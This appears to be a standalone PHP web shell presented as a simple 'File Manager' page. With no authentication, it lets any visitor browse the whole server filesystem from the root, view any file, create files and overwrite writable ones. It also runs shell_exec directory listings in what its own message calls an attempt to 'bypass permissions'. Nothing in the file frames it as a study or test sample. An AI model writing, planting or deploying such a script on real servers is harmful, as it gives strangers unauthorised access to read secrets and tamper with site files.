<?php
error_reporting(E_ALL);
ini_set('display_errors', 1); // Enable error reporting for debugging

$serverRoot = DIRECTORY_SEPARATOR; // "/" on Linux, "C:\" on Windows
$currentDir = isset($_GET['dir']) ? realpath($serverRoot . $_GET['dir']) : $serverRoot;

// If directory does not exist or is not accessible
if (!$currentDir || !is_dir($currentDir)) {
    die("<p style='color:red;'>⚠ Access denied or directory does not exist.</p>");
}

// Function to check if exec() is enabled
function is_exec_enabled() {
    return function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')));
}

// Attempt to list files if access is restricted
if (!is_readable($currentDir) && is_exec_enabled()) {
    try {
        $output = shell_exec("ls -la " . escapeshellarg($serverRoot));
        if ($output) { die("<pre>$output</pre>"); }
        $output = shell_exec("dir " . escapeshellarg($serverRoot));
        if ($output) { die("<pre>$output</pre>"); }
    } catch (Exception $e) {
        die("<p style='color:red;'>⚠ Failed to bypass permissions: " . $e->getMessage() . "</p>");
    }
}

// Handle file creation
if (isset($_POST['create_file']) && isset($_POST['filename'])) {
    $newFile = realpath($currentDir) . DIRECTORY_SEPARATOR . basename($_POST['filename']);
    if (!file_exists($newFile)) {
        if (file_put_contents($newFile, "") !== false) {
            chmod($newFile, 0644); // Set permissions
            echo "<p style='color:green;'>✅ File created successfully: " . htmlspecialchars($_POST['filename']) . "</p>";
        } else {
            echo "<p style='color:red;'>⚠ Failed to create file.</p>";
        }
    } else {
        echo "<p style='color:red;'>⚠ File already exists.</p>";
    }
}

// Handle file viewing
if (isset($_GET['view'])) {
    $filePath = realpath($serverRoot . $_GET['view']);
    if ($filePath && strpos($filePath, $serverRoot) === 0 && is_file($filePath)) {
        echo "<pre>" . htmlspecialchars(file_get_contents($filePath)) . "</pre>";
        exit;
    } else {
        die("<p style='color:red;'>⚠ Cannot access this file.</p>");
    }
}

// Handle file editing
if (isset($_POST['save']) && isset($_POST['file']) && isset($_POST['content'])) {
    $filePath = realpath($serverRoot . $_POST['file']);
    if ($filePath && strpos($filePath, $serverRoot) === 0 && is_writable($filePath)) {
        if (file_put_contents($filePath, $_POST['content']) !== false) {
            echo "<p style='color:green;'>✅ File saved successfully!</p>";
        } else {
            die("<p style='color:red;'>⚠ Failed to save file.</p>");
        }
    } else {
        die("<p style='color:red;'>⚠ Cannot edit this file.</p>");
    }
}

// List files & folders
$files = @scandir($currentDir);
if (!$files) { die("<p style='color:red;'>⚠ Failed to list directory contents.</p>"); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        a { text-decoration: none; color: blue; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #ddd; }
        form { margin-top: 20px; }
        textarea { width: 100%; height: 300px; }
        .breadcrumb { margin-bottom: 15px; }
    </style>
</head>
<body>
    <h2>File Manager</h2>
    <p>Current Directory: <?php echo htmlspecialchars($currentDir); ?></p>
    
    <!-- Breadcrumb Navigation -->
    <div class="breadcrumb">
        <a href="?dir=">Root</a> /
        <?php
        $pathParts = explode(DIRECTORY_SEPARATOR, trim(str_replace($serverRoot, '', $currentDir), DIRECTORY_SEPARATOR));
        $path = '';
        foreach ($pathParts as $part) {
            if ($part !== '') {
                $path .= DIRECTORY_SEPARATOR . $part;
                echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a> / ';
            }
        }
        ?>
    </div>

    <!-- File Creation Form -->
    <form method="post">
        <input type="text" name="filename" placeholder="Enter new file name" required>
        <button type="submit" name="create_file">Create File</button>
    </form>

    <table>
        <tr><th>Name</th><th>Actions</th></tr>
        <?php foreach ($files as $file): 
            if ($file == '.') continue;
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            $relativePath = str_replace($serverRoot, '', $filePath);
        ?>
        <tr>
            <td><?php echo htmlspecialchars($file); ?></td>
            <td>
                <?php if (is_dir($filePath)): ?>
                    <a href="?dir=<?php echo urlencode($relativePath); ?>">Open</a>
                <?php elseif (is_file($filePath)): ?>
                    <a href="?view=<?php echo urlencode($relativePath); ?>">View</a>
                    <a href="?edit=<?php echo urlencode($relativePath); ?>">Edit</a>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <?php if (isset($_GET['edit'])): 
        $editPath = realpath($serverRoot . $_GET['edit']);
        if ($editPath && strpos($editPath, $serverRoot) === 0 && is_file($editPath)):
            $content = file_get_contents($editPath);
    ?>
    <h3>Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
    <form method="post">
        <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
        <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
        <button type="submit" name="save">Save</button>
    </form>
    <?php endif; endif; ?>
</body>
</html>
